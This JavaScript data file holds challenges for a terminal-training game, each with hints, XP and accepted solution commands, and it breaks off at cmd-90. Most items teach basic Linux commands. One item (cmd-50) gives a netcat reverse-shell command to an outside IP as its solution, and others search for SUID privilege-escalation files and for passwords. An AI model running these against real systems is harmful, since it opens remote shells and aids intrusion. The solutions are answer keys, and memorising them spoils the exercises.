// ============================================================================
// TERMINAL CHALLENGE — Challenge Data (300 Challenges)
// ============================================================================

const CHALLENGES = {

  // ==========================================================================
  // COMMAND CHALLENGE (60 Challenges)
  // ==========================================================================
  command: [
    // ---- EASY (15) ----
    {
      id: 'cmd-1', title: 'Hello World', difficulty: 'easy', xp: 10,
      description: 'Print "Hello World" to the terminal.',
      objective: 'Use the echo command to display text.',
      hints: ['The echo command prints text to stdout.', 'Wrap the text in quotes.'],
      solutions: ['echo "Hello World"', 'echo Hello World', "echo 'Hello World'"],
      successMessage: '🎉 Great start! You printed your first message!'
    },
    {
      id: 'cmd-2', title: 'List Files', difficulty: 'easy', xp: 10,
      description: 'List all files in the current directory.',
      objective: 'Use a command to see directory contents.',
      hints: ['The command is two letters long.', 'It stands for "list".'],
      solutions: ['ls'],
      successMessage: '📂 You can now see what\'s in the directory!'
    },
    {
      id: 'cmd-3', title: 'Hidden Files', difficulty: 'easy', xp: 10,
      description: 'List all files including hidden ones with detailed information.',
      objective: 'Show hidden files and file details.',
      hints: ['Add flags to the ls command.', '-a shows hidden files, -l shows details.'],
      solutions: ['ls -la', 'ls -al', 'ls -a -l', 'ls -l -a'],
      successMessage: '👁️ Now you can see hidden files too!'
    },
    {
      id: 'cmd-4', title: 'Where Am I?', difficulty: 'easy', xp: 10,
      description: 'Print the current working directory.',
      objective: 'Find out your current location in the filesystem.',
      hints: ['Three letters: print working directory.', 'pwd'],
      solutions: ['pwd'],
      successMessage: '📍 You know exactly where you are!'
    },
    {
      id: 'cmd-5', title: 'Make Directory', difficulty: 'easy', xp: 10,
      description: 'Create a directory called "test".',
      objective: 'Use the mkdir command.',
      hints: ['mkdir creates directories.', 'mkdir followed by the name.'],
      solutions: ['mkdir test'],
      successMessage: '📁 Directory created successfully!'
    },
    {
      id: 'cmd-6', title: 'Read File', difficulty: 'easy', xp: 10,
      description: 'Display the contents of a file called "readme.txt".',
      objective: 'Read file contents using a command.',
      hints: ['Think of a small animal...', 'cat displays file contents.'],
      solutions: ['cat readme.txt'],
      successMessage: '📄 You read the file contents!'
    },
    {
      id: 'cmd-7', title: 'Remove File', difficulty: 'easy', xp: 10,
      description: 'Remove a file called "trash.txt".',
      objective: 'Delete a file from the filesystem.',
      hints: ['rm removes files.', 'rm followed by filename.'],
      solutions: ['rm trash.txt'],
      successMessage: '🗑️ File deleted!'
    },
    {
      id: 'cmd-8', title: 'Copy File', difficulty: 'easy', xp: 10,
      description: 'Copy "file1.txt" to "file2.txt".',
      objective: 'Duplicate a file with a new name.',
      hints: ['cp copies files.', 'cp source destination'],
      solutions: ['cp file1.txt file2.txt'],
      successMessage: '📋 File copied successfully!'
    },
    {
      id: 'cmd-9', title: 'Move File', difficulty: 'easy', xp: 10,
      description: 'Move (rename) "old.txt" to "new.txt".',
      objective: 'Rename a file using the move command.',
      hints: ['mv moves or renames files.', 'mv old new'],
      solutions: ['mv old.txt new.txt'],
      successMessage: '🔄 File renamed!'
    },
    {
      id: 'cmd-10', title: 'Touch File', difficulty: 'easy', xp: 10,
      description: 'Create an empty file called "newfile.txt".',
      objective: 'Create a new empty file.',
      hints: ['touch creates empty files.', 'touch filename'],
      solutions: ['touch newfile.txt'],
      successMessage: '✨ Empty file created!'
    },
    {
      id: 'cmd-11', title: 'Head of File', difficulty: 'easy', xp: 10,
      description: 'Display the first 10 lines of "log.txt".',
      objective: 'View the beginning of a file.',
      hints: ['The opposite of tail.', 'head shows the first lines.'],
      solutions: ['head log.txt', 'head -n 10 log.txt', 'head -10 log.txt'],
      successMessage: '⬆️ You peeked at the top of the file!'
    },
    {
      id: 'cmd-12', title: 'Tail of File', difficulty: 'easy', xp: 10,
      description: 'Display the last 10 lines of "log.txt".',
      objective: 'View the end of a file.',
      hints: ['The opposite of head.', 'tail shows the last lines.'],
      solutions: ['tail log.txt', 'tail -n 10 log.txt', 'tail -10 log.txt'],
      successMessage: '⬇️ You checked the bottom of the file!'
    },
    {
      id: 'cmd-13', title: 'Date & Time', difficulty: 'easy', xp: 10,
      description: 'Show the current date and time.',
      objective: 'Display system date/time.',
      hints: ['A four-letter command.', 'date'],
      solutions: ['date'],
      successMessage: '🕐 Now you know the time!'
    },
    {
      id: 'cmd-14', title: 'Who Am I?', difficulty: 'easy', xp: 10,
      description: 'Display the current username.',
      objective: 'Find out who you are logged in as.',
      hints: ['Ask the system who you are.', 'whoami'],
      solutions: ['whoami'],
      successMessage: '🧑 Identity confirmed!'
    },
    {
      id: 'cmd-15', title: 'Clear Screen', difficulty: 'easy', xp: 10,
      description: 'Clear the terminal screen.',
      objective: 'Clean up the terminal display.',
      hints: ['A five-letter word meaning to clean.', 'clear'],
      solutions: ['clear'],
      successMessage: '🧹 Terminal cleared!'
    },

    // ---- MEDIUM (15) ----
    {
      id: 'cmd-16', title: 'Find Files', difficulty: 'medium', xp: 25,
      description: 'Find all .txt files in the current directory recursively.',
      objective: 'Use the find command with name pattern.',
      hints: ['find searches for files.', 'Use -name with a wildcard pattern.'],
      solutions: ['find . -name "*.txt"', "find . -name '*.txt'", 'find . -name *.txt'],
      successMessage: '🔍 You found all the text files!'
    },
    {
      id: 'cmd-17', title: 'Count Lines', difficulty: 'medium', xp: 25,
      description: 'Count the number of lines in "data.log".',
      objective: 'Use word count to count lines.',
      hints: ['wc counts things in files.', '-l flag counts lines.'],
      solutions: ['wc -l data.log'],
      successMessage: '🔢 Lines counted!'
    },
    {
      id: 'cmd-18', title: 'Search Text', difficulty: 'medium', xp: 25,
      description: 'Search for the word "error" in "server.log".',
      objective: 'Find text patterns in a file.',
      hints: ['grep searches for patterns.', 'grep pattern filename'],
      solutions: ['grep "error" server.log', "grep 'error' server.log", 'grep error server.log'],
      successMessage: '🎯 Pattern found!'
    },
    {
      id: 'cmd-19', title: 'Disk Usage', difficulty: 'medium', xp: 25,
      description: 'Display disk usage in human-readable format.',
      objective: 'Check disk space on the system.',
      hints: ['df shows disk free space.', '-h makes it human-readable.'],
      solutions: ['df -h'],
      successMessage: '💾 Disk usage displayed!'
    },
    {
      id: 'cmd-20', title: 'Last 20 Lines', difficulty: 'medium', xp: 25,
      description: 'Show the last 20 lines of "access.log".',
      objective: 'Use tail with a line count.',
      hints: ['tail with -n flag specifies lines.', 'tail -n 20 or tail -20'],
      solutions: ['tail -n 20 access.log', 'tail -20 access.log'],
      successMessage: '📜 Got the last 20 lines!'
    },
    {
      id: 'cmd-21', title: 'Sort File', difficulty: 'medium', xp: 25,
      description: 'Sort the contents of "names.txt" alphabetically.',
      objective: 'Order file contents.',
      hints: ['sort is the command you need.', 'sort filename'],
      solutions: ['sort names.txt'],
      successMessage: '🔤 File sorted alphabetically!'
    },
    {
      id: 'cmd-22', title: 'Unique Lines', difficulty: 'medium', xp: 25,
      description: 'Display only unique lines from "data.txt" (remove duplicates).',
      objective: 'Filter out duplicate lines.',
      hints: ['uniq removes adjacent duplicates.', 'Often used with sort.'],
      solutions: ['uniq data.txt', 'sort data.txt | uniq', 'sort -u data.txt'],
      successMessage: '✨ Duplicates removed!'
    },
    {
      id: 'cmd-23', title: 'File Type', difficulty: 'medium', xp: 25,
      description: 'Show the file type of "mystery_file".',
      objective: 'Identify what kind of file something is.',
      hints: ['The command is the same as the concept.', 'file command identifies file types.'],
      solutions: ['file mystery_file'],
      successMessage: '🔎 File type identified!'
    },
    {
      id: 'cmd-24', title: 'Make Executable', difficulty: 'medium', xp: 25,
      description: 'Change permissions of "script.sh" to make it executable.',
      objective: 'Modify file permissions.',
      hints: ['chmod changes permissions.', '+x adds execute permission.'],
      solutions: ['chmod +x script.sh', 'chmod 755 script.sh', 'chmod a+x script.sh'],
      successMessage: '⚡ Script is now executable!'
    },
    {
      id: 'cmd-25', title: 'Symbolic Link', difficulty: 'medium', xp: 25,
      description: 'Create a symbolic link called "link" pointing to "source".',
      objective: 'Create a symlink.',
      hints: ['ln creates links.', '-s makes it symbolic.'],
      solutions: ['ln -s source link'],
      successMessage: '🔗 Symbolic link created!'
    },
    {
      id: 'cmd-26', title: 'Directory Sizes', difficulty: 'medium', xp: 25,
      description: 'Display the size of each file in the current directory in human-readable format.',
      objective: 'Check sizes of files.',
      hints: ['du shows disk usage.', '-sh for summary and human-readable.'],
      solutions: ['du -sh *', 'du -sh ./*'],
      successMessage: '📊 Sizes displayed!'
    },
    {
      id: 'cmd-27', title: 'Download File', difficulty: 'medium', xp: 25,
      description: 'Download a file from "http://example.com/file.txt".',
      objective: 'Fetch a file from the internet.',
      hints: ['wget downloads files.', 'curl can also be used with -O.'],
      solutions: ['wget http://example.com/file.txt', 'curl -O http://example.com/file.txt'],
      successMessage: '⬇️ File downloaded!'
    },
    {
      id: 'cmd-28', title: 'Environment Variables', difficulty: 'medium', xp: 25,
      description: 'Show all environment variables.',
      objective: 'View system environment.',
      hints: ['env shows all variables.', 'printenv also works.'],
      solutions: ['env', 'printenv'],
      successMessage: '🌍 Environment variables listed!'
    },
    {
      id: 'cmd-29', title: 'Manual Pages', difficulty: 'medium', xp: 25,
      description: 'Display the manual page for the "ls" command.',
      objective: 'Read documentation for a command.',
      hints: ['man shows manual pages.', 'man command_name'],
      solutions: ['man ls'],
      successMessage: '📖 Manual page opened!'
    },
    {
      id: 'cmd-30', title: 'Concatenate Files', difficulty: 'medium', xp: 25,
      description: 'Concatenate "file1.txt" and "file2.txt" into "combined.txt".',
      objective: 'Merge files together.',
      hints: ['cat can join files.', 'Use > to redirect output.'],
      solutions: ['cat file1.txt file2.txt > combined.txt'],
      successMessage: '📎 Files merged!'
    },

    // ---- HARD (15) ----
    {
      id: 'cmd-31', title: 'Recently Modified', difficulty: 'hard', xp: 50,
      description: 'Find all files modified in the last 24 hours.',
      objective: 'Search by modification time.',
      hints: ['find has a -mtime flag.', '-1 means less than 1 day ago.'],
      solutions: ['find . -mtime -1', 'find . -mtime 0'],
      successMessage: '⏰ Found recent files!'
    },
    {
      id: 'cmd-32', title: 'Find & Replace', difficulty: 'hard', xp: 50,
      description: 'Replace all occurrences of "foo" with "bar" in file.txt.',
      objective: 'Use sed for text substitution.',
      hints: ['sed is a stream editor.', "s/old/new/g replaces globally."],
      solutions: ["sed -i 's/foo/bar/g' file.txt", 'sed -i "s/foo/bar/g" file.txt'],
      successMessage: '✏️ Text replaced!'
    },
    {
      id: 'cmd-33', title: 'Sort Unique', difficulty: 'hard', xp: 50,
      description: 'Display sorted unique lines from "data.txt".',
      objective: 'Combine sorting and deduplication.',
      hints: ['sort has a unique flag.', '-u removes duplicates after sorting.'],
      solutions: ['sort -u data.txt', 'sort data.txt | uniq'],
      successMessage: '🎯 Sorted and unique!'
    },
    {
      id: 'cmd-34', title: 'Create Archive', difficulty: 'hard', xp: 50,
      description: 'Archive the /var/log directory with gzip compression into logs.tar.gz.',
      objective: 'Create a compressed archive.',
      hints: ['tar creates archives.', '-czf = create, gzip, filename.'],
      solutions: ['tar -czf logs.tar.gz /var/log', 'tar czf logs.tar.gz /var/log'],
      successMessage: '📦 Archive created!'
    },
    {
      id: 'cmd-35', title: 'Memory Hog', difficulty: 'hard', xp: 50,
      description: 'Show all running processes sorted by memory usage (highest first).',
      objective: 'Monitor process memory consumption.',
      hints: ['ps shows processes.', 'Use --sort flag with -%mem.'],
      solutions: ['ps aux --sort=-%mem', 'ps aux --sort -%mem'],
      successMessage: '🧠 Memory hogs identified!'
    },
    {
      id: 'cmd-36', title: 'Big Files', difficulty: 'hard', xp: 50,
      description: 'Find all files larger than 100MB on the system.',
      objective: 'Search by file size.',
      hints: ['find with -size flag.', '+100M means larger than 100 megabytes.'],
      solutions: ['find / -size +100M', 'find / -size +100M -type f'],
      successMessage: '🐘 Found the big files!'
    },
    {
      id: 'cmd-37', title: 'Recursive Grep', difficulty: 'hard', xp: 50,
      description: 'Search recursively for the word "password" in all files under the current directory.',
      objective: 'Search across multiple files.',
      hints: ['grep with -r flag searches recursively.', 'grep -r pattern directory'],
      solutions: ['grep -r "password" .', "grep -r 'password' .", 'grep -r password .', 'grep -rn "password" .'],
      successMessage: '🔓 Found occurrences!'
    },
    {
      id: 'cmd-38', title: 'Diff Files', difficulty: 'hard', xp: 50,
      description: 'Show the differences between "file1.txt" and "file2.txt".',
      objective: 'Compare two files.',
      hints: ['diff compares files.', 'diff file1 file2'],
      solutions: ['diff file1.txt file2.txt'],
      successMessage: '📝 Differences found!'
    },
    {
      id: 'cmd-39', title: 'Word Count', difficulty: 'hard', xp: 50,
      description: 'Display the number of words in "essay.txt".',
      objective: 'Count words in a file.',
      hints: ['wc counts words too.', '-w flag counts words.'],
      solutions: ['wc -w essay.txt'],
      successMessage: '📊 Words counted!'
    },
    {
      id: 'cmd-40', title: 'Kill Process', difficulty: 'hard', xp: 50,
      description: 'Kill the process with PID 1234.',
      objective: 'Terminate a running process.',
      hints: ['kill sends signals to processes.', 'kill PID'],
      solutions: ['kill 1234', 'kill -9 1234', 'kill -SIGKILL 1234'],
      successMessage: '💀 Process terminated!'
    },
    {
      id: 'cmd-41', title: 'Schedule Task', difficulty: 'hard', xp: 50,
      description: 'Schedule the command "backup.sh" to run at midnight using at.',
      objective: 'Schedule a one-time task.',
      hints: ['at schedules commands.', 'Echo the command and pipe to at.'],
      solutions: ['echo "backup.sh" | at midnight', "echo 'backup.sh' | at midnight"],
      successMessage: '⏰ Task scheduled!'
    },
    {
      id: 'cmd-42', title: 'List Packages', difficulty: 'hard', xp: 50,
      description: 'List all installed packages on a Debian-based system.',
      objective: 'Query the package manager.',
      hints: ['dpkg manages Debian packages.', '-l lists installed packages.'],
      solutions: ['dpkg -l', 'dpkg --list', 'apt list --installed'],
      successMessage: '📦 Packages listed!'
    },
    {
      id: 'cmd-43', title: 'Open Ports', difficulty: 'hard', xp: 50,
      description: 'Show all open TCP/UDP ports that are listening on the system.',
      objective: 'Check network listeners.',
      hints: ['ss or netstat show network stats.', '-tuln shows TCP/UDP listening numeric.'],
      solutions: ['ss -tuln', 'netstat -tuln'],
      successMessage: '🔌 Listening ports found!'
    },
    {
      id: 'cmd-44', title: 'Compress File', difficulty: 'hard', xp: 50,
      description: 'Compress "file.txt" using gzip.',
      objective: 'Reduce file size.',
      hints: ['gzip compresses files.', 'gzip filename'],
      solutions: ['gzip file.txt'],
      successMessage: '🗜️ File compressed!'
    },
    {
      id: 'cmd-45', title: 'Find Duplicates', difficulty: 'hard', xp: 50,
      description: 'Find duplicate files by their MD5 checksum in the current directory.',
      objective: 'Identify duplicate files using checksums.',
      hints: ['md5sum creates checksums.', 'Use find, md5sum, sort, and uniq together.'],
      solutions: ['find . -type f -exec md5sum {} + | sort | uniq -d -w 32', 'find . -type f -exec md5sum {} \\; | sort | uniq -d -w 32'],
      successMessage: '♊ Duplicates detected!'
    },

    // ---- EXPERT (15) ----
    {
      id: 'cmd-46', title: 'Extract CSV Column', difficulty: 'expert', xp: 100,
      description: 'Extract column 2 from a CSV file using comma as delimiter.',
      objective: 'Parse structured data with cut.',
      hints: ['cut extracts sections from lines.', "-d sets delimiter, -f selects field."],
      solutions: ["cut -d',' -f2 file.csv", 'cut -d"," -f2 file.csv', "cut -d , -f2 file.csv"],
      successMessage: '📊 Column extracted!'
    },
    {
      id: 'cmd-47', title: 'Live Monitor', difficulty: 'expert', xp: 100,
      description: 'Monitor the file /var/log/syslog in real-time for new entries.',
      objective: 'Follow file changes live.',
      hints: ['tail has a follow mode.', '-f flag follows the file.'],
      solutions: ['tail -f /var/log/syslog'],
      successMessage: '📡 Live monitoring active!'
    },
    {
      id: 'cmd-48', title: 'Purge Empty', difficulty: 'expert', xp: 100,
      description: 'Find and delete all empty files recursively in the current directory.',
      objective: 'Combine find conditions with actions.',
      hints: ['find can delete files directly.', '-empty finds empty files, -delete removes them.'],
      solutions: ['find . -type f -empty -delete'],
      successMessage: '🧹 Empty files purged!'
    },
    {
      id: 'cmd-49', title: 'Network Connections', difficulty: 'expert', xp: 100,
      description: 'List all open network connections with process information.',
      objective: 'View active network connections.',
      hints: ['netstat or ss shows connections.', '-tuln for TCP/UDP listening numeric.'],
      solutions: ['netstat -tuln', 'netstat -tulnp', 'ss -tuln', 'ss -tulnp'],
      successMessage: '🌐 Network mapped!'
    },
    {
      id: 'cmd-50', title: 'Reverse Shell', difficulty: 'expert', xp: 100,
      description: 'Create a reverse shell connection using netcat to IP 10.10.10.1 on port 4444.',
      objective: 'Establish a reverse shell (for CTF use only!).',
      hints: ['nc (netcat) can create connections.', '-e executes a program on connect.'],
      solutions: ['nc -e /bin/sh 10.10.10.1 4444', 'nc -e /bin/bash 10.10.10.1 4444'],
      successMessage: '🐚 Reverse shell established!'
    },
    {
      id: 'cmd-51', title: 'Search Compressed', difficulty: 'expert', xp: 100,
      description: 'Search for the word "critical" inside a gzipped file "archive.gz" without decompressing it.',
      objective: 'Search within compressed files.',
      hints: ['zgrep searches compressed files.', 'Same syntax as grep.'],
      solutions: ['zgrep "critical" archive.gz', "zgrep 'critical' archive.gz", 'zgrep critical archive.gz'],
      successMessage: '🔍 Found in compressed file!'
    },
    {
      id: 'cmd-52', title: 'Find & Execute', difficulty: 'expert', xp: 100,
      description: 'Find all .log files and delete them using find with -exec.',
      objective: 'Execute commands on found files.',
      hints: ['find -exec runs a command on results.', '{} is replaced by the filename.'],
      solutions: ['find . -name "*.log" -exec rm {} \\;', "find . -name '*.log' -exec rm {} \\;", 'find . -name "*.log" -delete'],
      successMessage: '🗑️ Log files cleaned up!'
    },
    {
      id: 'cmd-53', title: 'SSH Tunnel', difficulty: 'expert', xp: 100,
      description: 'Create an SSH tunnel forwarding local port 8080 to remote port 80 on host "server".',
      objective: 'Set up port forwarding via SSH.',
      hints: ['ssh -L creates local port forwards.', 'Format: -L local:remote_host:remote_port'],
      solutions: ['ssh -L 8080:localhost:80 user@server', 'ssh -L 8080:localhost:80 server'],
      successMessage: '🚇 SSH tunnel established!'
    },
    {
      id: 'cmd-54', title: 'Awk Sum', difficulty: 'expert', xp: 100,
      description: 'Use awk to sum all numbers in column 3 of "data.txt".',
      objective: 'Process tabular data with awk.',
      hints: ['awk processes text by fields.', '$3 refers to the third column.'],
      solutions: ["awk '{sum+=$3} END {print sum}' data.txt"],
      successMessage: '🧮 Sum calculated!'
    },
    {
      id: 'cmd-55', title: 'System Monitor', difficulty: 'expert', xp: 100,
      description: 'Monitor system resources (CPU, memory) in real-time.',
      objective: 'Use an interactive system monitor.',
      hints: ['A three-letter command.', 'top or htop'],
      solutions: ['top', 'htop'],
      successMessage: '📈 System monitor launched!'
    },
    {
      id: 'cmd-56', title: 'Cron Jobs', difficulty: 'expert', xp: 100,
      description: 'List all cron jobs for the current user.',
      objective: 'View scheduled recurring tasks.',
      hints: ['crontab manages cron jobs.', '-l lists them.'],
      solutions: ['crontab -l'],
      successMessage: '📅 Cron jobs listed!'
    },
    {
      id: 'cmd-57', title: 'SUID Files', difficulty: 'expert', xp: 100,
      description: 'Find all files with SUID permission set on the system.',
      objective: 'Identify privilege escalation vectors.',
      hints: ['find with -perm flag.', '-4000 checks for SUID bit.'],
      solutions: ['find / -perm -4000 2>/dev/null', 'find / -perm -u=s 2>/dev/null', 'find / -perm -4000'],
      successMessage: '⚠️ SUID files identified!'
    },
    {
      id: 'cmd-58', title: 'Hash File', difficulty: 'expert', xp: 100,
      description: 'Generate the MD5 hash of "file.txt".',
      objective: 'Create a file checksum.',
      hints: ['md5sum creates MD5 hashes.', 'md5sum filename'],
      solutions: ['md5sum file.txt'],
      successMessage: '#️⃣ Hash generated!'
    },
    {
      id: 'cmd-59', title: 'Recursive Chown', difficulty: 'expert', xp: 100,
      description: 'Change ownership of /opt/app and all contents to user "deploy" and group "www".',
      objective: 'Recursively change file ownership.',
      hints: ['chown changes ownership.', '-R makes it recursive.'],
      solutions: ['chown -R deploy:www /opt/app'],
      successMessage: '👤 Ownership changed!'
    },
    {
      id: 'cmd-60', title: 'Xargs Pipeline', difficulty: 'expert', xp: 100,
      description: 'Use grep to find files containing "TODO" and delete them with xargs.',
      objective: 'Build powerful command pipelines.',
      hints: ['grep -rl finds files containing text.', 'Pipe to xargs rm.'],
      solutions: ['grep -rl "TODO" . | xargs rm', "grep -rl 'TODO' . | xargs rm"],
      successMessage: '🔗 Pipeline mastered!'
    },

    // ---- NEW EASY (10): cmd-61 to cmd-70 ----
    {
      id: 'cmd-61', title: 'Calendar', difficulty: 'easy', xp: 10,
      description: 'Display the current month\'s calendar.',
      objective: 'Use the cal command.',
      hints: ['A three-letter command.', 'cal shows a calendar.'],
      solutions: ['cal'],
      successMessage: '📅 Calendar displayed!'
    },
    {
      id: 'cmd-62', title: 'System Uptime', difficulty: 'easy', xp: 10,
      description: 'Show how long the system has been running.',
      objective: 'Check system uptime.',
      hints: ['The command literally means how long it has been up.', 'uptime'],
      solutions: ['uptime'],
      successMessage: '⏱️ Uptime checked!'
    },
    {
      id: 'cmd-63', title: 'Hostname', difficulty: 'easy', xp: 10,
      description: 'Display the system\'s hostname.',
      objective: 'Find the name of this machine.',
      hints: ['The command is the same as the concept.', 'hostname'],
      solutions: ['hostname'],
      successMessage: '🖥️ Hostname revealed!'
    },
    {
      id: 'cmd-64', title: 'System Info', difficulty: 'easy', xp: 10,
      description: 'Display all system information using uname.',
      objective: 'Get kernel and OS details.',
      hints: ['uname shows system info.', '-a flag shows all info.'],
      solutions: ['uname -a'],
      successMessage: '🖥️ Full system info displayed!'
    },
    {
      id: 'cmd-65', title: 'Environment Variables', difficulty: 'easy', xp: 10,
      description: 'Print all environment variables.',
      objective: 'List all environment variables.',
      hints: ['Three letters: env.', 'Or use printenv.'],
      solutions: ['env', 'printenv'],
      successMessage: '🌐 Environment variables listed!'
    },
    {
      id: 'cmd-66', title: 'Create Alias', difficulty: 'easy', xp: 10,
      description: 'Create an alias called "ll" that runs "ls -la".',
      objective: 'Set up a command shortcut.',
      hints: ['alias name=command', 'Put the command in quotes.'],
      solutions: ['alias ll="ls -la"', "alias ll='ls -la'"],
      successMessage: '⚡ Alias created!'
    },
    {
      id: 'cmd-67', title: 'Command History', difficulty: 'easy', xp: 10,
      description: 'Display the command history.',
      objective: 'View previously executed commands.',
      hints: ['The command is the same as the concept.', 'history'],
      solutions: ['history'],
      successMessage: '📜 Command history revealed!'
    },
    {
      id: 'cmd-68', title: 'Manual Pages', difficulty: 'easy', xp: 10,
      description: 'Open the manual page for the "ls" command.',
      objective: 'Learn to read documentation.',
      hints: ['man is short for manual.', 'man followed by command name.'],
      solutions: ['man ls'],
      successMessage: '📖 Manual page opened!'
    },
    {
      id: 'cmd-69', title: 'Which Command', difficulty: 'easy', xp: 10,
      description: 'Find the full path of the "python3" executable.',
      objective: 'Locate where a command lives.',
      hints: ['which shows the path to a command.', 'which command_name'],
      solutions: ['which python3'],
      successMessage: '📍 Command location found!'
    },
    {
      id: 'cmd-70', title: 'Word Count', difficulty: 'easy', xp: 10,
      description: 'Count the number of words in "essay.txt".',
      objective: 'Use word count with the words flag.',
      hints: ['wc counts things.', '-w counts words.'],
      solutions: ['wc -w essay.txt'],
      successMessage: '🔢 Words counted!'
    },

    // ---- NEW MEDIUM (10): cmd-71 to cmd-80 ----
    {
      id: 'cmd-71', title: 'Symbolic Link', difficulty: 'medium', xp: 25,
      description: 'Create a symbolic link called "shortcut" pointing to "/var/log/syslog".',
      objective: 'Create a soft link to a file.',
      hints: ['ln creates links.', '-s makes it symbolic.'],
      solutions: ['ln -s /var/log/syslog shortcut'],
      successMessage: '🔗 Symbolic link created!'
    },
    {
      id: 'cmd-72', title: 'File Differences', difficulty: 'medium', xp: 25,
      description: 'Compare "file_a.txt" and "file_b.txt" to show their differences.',
      objective: 'Find differences between two files.',
      hints: ['diff compares files.', 'diff file1 file2'],
      solutions: ['diff file_a.txt file_b.txt'],
      successMessage: '🔀 Differences found!'
    },
    {
      id: 'cmd-73', title: 'Cut Columns', difficulty: 'medium', xp: 25,
      description: 'Extract the first column from "data.csv" using comma as delimiter.',
      objective: 'Cut specific fields from structured data.',
      hints: ['cut extracts fields.', '-d sets delimiter, -f selects fields.'],
      solutions: ['cut -d, -f1 data.csv', 'cut -d "," -f1 data.csv', "cut -d ',' -f1 data.csv"],
      successMessage: '✂️ Column extracted!'
    },
    {
      id: 'cmd-74', title: 'Paste Files', difficulty: 'medium', xp: 25,
      description: 'Merge "names.txt" and "scores.txt" side by side with a tab separator.',
      objective: 'Combine files horizontally.',
      hints: ['paste merges files line by line.', 'paste file1 file2'],
      solutions: ['paste names.txt scores.txt'],
      successMessage: '📋 Files merged!'
    },
    {
      id: 'cmd-75', title: 'Tee Output', difficulty: 'medium', xp: 25,
      description: 'Run "ls -la" and save the output to "listing.txt" while also displaying it.',
      objective: 'Write to file and stdout simultaneously.',
      hints: ['tee reads from stdin and writes to both stdout and a file.', 'Pipe ls output to tee.'],
      solutions: ['ls -la | tee listing.txt'],
      successMessage: '📝 Output teed!'
    },
    {
      id: 'cmd-76', title: 'Base Name', difficulty: 'medium', xp: 25,
      description: 'Extract just the filename from the path "/home/user/documents/report.pdf".',
      objective: 'Strip directory from a path.',
      hints: ['basename strips directory prefixes.', 'basename /path/to/file'],
      solutions: ['basename /home/user/documents/report.pdf'],
      successMessage: '📄 Filename extracted!'
    },
    {
      id: 'cmd-77', title: 'Directory Name', difficulty: 'medium', xp: 25,
      description: 'Extract just the directory path from "/home/user/documents/report.pdf".',
      objective: 'Get the directory component of a path.',
      hints: ['dirname is the opposite of basename.', 'dirname /path/to/file'],
      solutions: ['dirname /home/user/documents/report.pdf'],
      successMessage: '📂 Directory path extracted!'
    },
    {
      id: 'cmd-78', title: 'File Statistics', difficulty: 'medium', xp: 25,
      description: 'Display detailed file information (size, permissions, timestamps) for "config.ini".',
      objective: 'Get comprehensive file metadata.',
      hints: ['stat shows detailed file info.', 'stat filename'],
      solutions: ['stat config.ini'],
      successMessage: '📊 File stats retrieved!'
    },
    {
      id: 'cmd-79', title: 'Split File', difficulty: 'medium', xp: 25,
      description: 'Split "bigfile.txt" into chunks of 100 lines each.',
      objective: 'Break a large file into smaller pieces.',
      hints: ['split divides files.', '-l specifies lines per chunk.'],
      solutions: ['split -l 100 bigfile.txt', 'split -l100 bigfile.txt'],
      successMessage: '✂️ File split into chunks!'
    },
    {
      id: 'cmd-80', title: 'Common Lines', difficulty: 'medium', xp: 25,
      description: 'Find lines common to both "list1.txt" and "list2.txt" (both sorted).',
      objective: 'Compare sorted files for shared content.',
      hints: ['comm compares sorted files.', '-12 shows only common lines.'],
      solutions: ['comm -12 list1.txt list2.txt'],
      successMessage: '🔍 Common lines found!'
    },

    // ---- NEW HARD (10): cmd-81 to cmd-90 ----
    {
      id: 'cmd-81', title: 'Firewall Rules', difficulty: 'hard', xp: 50,
      description: 'List all current iptables firewall rules.',
      objective: 'Inspect the firewall configuration.',
      hints: ['iptables manages firewall rules.', '-L lists all rules.'],
      solutions: ['iptables -L', 'sudo iptables -L'],
      successMessage: '🔥 Firewall rules listed!'
    },
    {
      id: 'cmd-82', title: 'Open Files', difficulty: 'hard', xp: 50,
      description: 'List all open files on the system.',
      objective: 'See what files are currently in use.',
      hints: ['lsof = list open files.', 'Just run the command by itself.'],
      solutions: ['lsof', 'sudo lsof'],
      successMessage: '📂 Open files listed!'
    },
    {
      id: 'cmd-83', title: 'Trace System Calls', difficulty: 'hard', xp: 50,
      description: 'Trace the system calls made by the "ls" command.',
      objective: 'Debug a program at the syscall level.',
      hints: ['strace traces system calls.', 'strace command'],
      solutions: ['strace ls'],
      successMessage: '🔬 System calls traced!'
    },
    {
      id: 'cmd-84', title: 'Listening Ports', difficulty: 'hard', xp: 50,
      description: 'Show all TCP and UDP listening ports with process names.',
      objective: 'Identify active network services.',
      hints: ['ss is the modern socket statistics tool.', '-tuln shows TCP/UDP listening numeric.'],
      solutions: ['ss -tuln', 'ss -tulnp'],
      successMessage: '🌐 Listening ports revealed!'
    },
    {
      id: 'cmd-85', title: 'Service Status', difficulty: 'hard', xp: 50,
      description: 'Check the status of the "nginx" service using systemctl.',
      objective: 'Manage systemd services.',
      hints: ['systemctl controls services.', 'systemctl status service_name'],
      solutions: ['systemctl status nginx'],
      successMessage: '⚙️ Service status checked!'
    },
    {
      id: 'cmd-86', title: 'System Logs', difficulty: 'hard', xp: 50,
      description: 'View the last 50 lines of the system journal using journalctl.',
      objective: 'Read systemd journal logs.',
      hints: ['journalctl reads the journal.', '-n specifies number of lines.'],
      solutions: ['journalctl -n 50'],
      successMessage: '📋 Journal logs displayed!'
    },
    {
      id: 'cmd-87', title: 'Chroot Jail', difficulty: 'hard', xp: 50,
      description: 'Change the root directory to "/jail" and run /bin/bash.',
      objective: 'Create an isolated filesystem environment.',
      hints: ['chroot changes the apparent root directory.', 'chroot newroot command'],
      solutions: ['chroot /jail /bin/bash', 'sudo chroot /jail /bin/bash'],
      successMessage: '🔒 Chroot jail entered!'
    },
    {
      id: 'cmd-88', title: 'Disk Clone', difficulty: 'hard', xp: 50,
      description: 'Create a disk image of /dev/sda to "backup.img" using dd.',
      objective: 'Clone a disk or partition.',
      hints: ['dd copies and converts data.', 'if= input, of= output.'],
      solutions: ['dd if=/dev/sda of=backup.img', 'sudo dd if=/dev/sda of=backup.img'],
      successMessage: '💾 Disk cloned!'
    },
    {
      id: 'cmd-89', title: 'Remote Sync', difficulty: 'hard', xp: 50,
      description: 'Synchronize the local "src/" directory to "backup/" preserving all attributes.',
      objective: 'Efficiently sync directories.',
      hints: ['rsync synchronizes files.', '-av preserves attributes and is verbose.'],
      solutions: ['rsync -av src/ backup/', 'rsync -av src/ backup'],
      successMessage: '🔄 Directories synced!'
    },
    {
      id: 'cmd-90', title: 'Cron Jobs', difficulty: 'hard', xp: 50,
      description: 'List all scheduled cron jobs for the current user.',
      objective: 'View scheduled tasks.',
